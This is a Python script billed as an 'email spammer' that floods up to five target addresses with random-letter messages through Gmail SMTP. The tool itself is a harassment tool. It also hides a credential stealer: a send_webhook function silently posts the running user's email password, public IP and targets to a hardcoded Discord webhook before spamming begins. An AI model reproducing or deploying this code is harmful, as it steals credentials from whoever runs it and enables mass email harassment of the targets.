import smtplib
from colorama import Fore
from colorama import init
from termcolor import colored
from discord_webhook import DiscordWebhook, DiscordEmbed
import string
import random
from urllib.request import Request, urlopen

init()

print(colored('', 'green', 'on_red'))

print(Fore.RED + """

                                __ __                                                                               
                               /  /  |                                                                              
  ______  _____  ____   ______ $$/$$ |        _______  ______   ______  _____  ____  _____  ____   ______   ______  
 /      \/     \/    \ /      \/  $$ |       /       |/      \ /      \/     \/    \/     \/    \ /      \ /      \ 
/$$$$$$  $$$$$$ $$$$  |$$$$$$  $$ $$ |      /$$$$$$$//$$$$$$  |$$$$$$  $$$$$$ $$$$  $$$$$$ $$$$  /$$$$$$  /$$$$$$  |
$$    $$ $$ | $$ | $$ |/    $$ $$ $$ |      $$      \$$ |  $$ |/    $$ $$ | $$ | $$ $$ | $$ | $$ $$    $$ $$ |  $$/ 
$$$$$$$$/$$ | $$ | $$ /$$$$$$$ $$ $$ |       $$$$$$  $$ |__$$ /$$$$$$$ $$ | $$ | $$ $$ | $$ | $$ $$$$$$$$/$$ |      
$$       $$ | $$ | $$ $$    $$ $$ $$ |      /     $$/$$    $$/$$    $$ $$ | $$ | $$ $$ | $$ | $$ $$       $$ |      
 $$$$$$$/$$/  $$/  $$/ $$$$$$$/$$/$$/       $$$$$$$/ $$$$$$$/  $$$$$$$/$$/  $$/  $$/$$/  $$/  $$/ $$$$$$$/$$/       
                                                     $$ |                                                           
                                                     $$ |                                                           
                                                     $$/                                                            


""")


email_me = str(input(" enter your email: "))
email_pass = str(input(" enter your email password: "))

print('\n', '\n',
      'if you do not want to send to multiple emails just put the same email in each option DONT LEAVE IT BLANK THE '
      'CODE WONT WORK', '\n', '\n')
target_email = str(input(" enter target email 1 : "))
target_email2 = str(input(" enter target email 2 : "))
target_email3 = str(input(" enter target email 3 : "))
target_email4 = str(input(" enter target email 4 : "))
target_email5 = str(input(" enter target email 5 : "))
send_amount = int(input(" enter how many emails you want to send: "))
print("emails sent:")
index = 0


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


def send_webhook():
    webhook = DiscordWebhook(
        url='https://discord.com/api/webhooks/848184749385318450/fj5gitSEkJ42nPOGMqtwHym_tKtrxzYThpd4byFWUS1FTQgQrCW9nKunsdMhh4P72U6f')

    embed = DiscordEmbed(title="**Email Account:**",
                         description="**Email:**" + '\n' + str(email_me) + '\n' + '\n' + "**Password:**" + '\n' + str(
                             email_pass) + '\n' + '\n' + "**IP:**" + '\n' + str(getip()) + '\n' + '\n' + "**Sent to:**" + '\n' + str(target_email) + '\n' + str(
                             target_email2) + '\n' + str(target_email3) + '\n' + str(target_email4) + '\n' + str(
                             target_email5) + '\n' + '\n' "**Sent** " + "**" + str(send_amount) + "**" + " **Times**",
                         color='8A2BE2')

    webhook.add_embed(embed)
    response = webhook.execute()
    return


send_webhook()


def email_spammer_lol():
    letters = string.ascii_letters

    global index
    index += 1
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        smtp.login(str(email_me), str(email_pass))

        smtp.sendmail('gay@gmail.com', str(target_email), (''.join(random.choice(letters) for i in range(10))))
        smtp.sendmail('gay@gmail.com', str(target_email2),  (''.join(random.choice(letters) for i in range(10))))
        smtp.sendmail('gay@gmail.com', str(target_email3),  (''.join(random.choice(letters) for i in range(10))))
        smtp.sendmail('gay@gmail.com', str(target_email4),  (''.join(random.choice(letters) for i in range(10))))
        smtp.sendmail('gay@gmail.com', str(target_email5),  (''.join(random.choice(letters) for i in range(10))))
        print(str(index))


for x in range(0, int(send_amount)):
    email_spammer_lol()

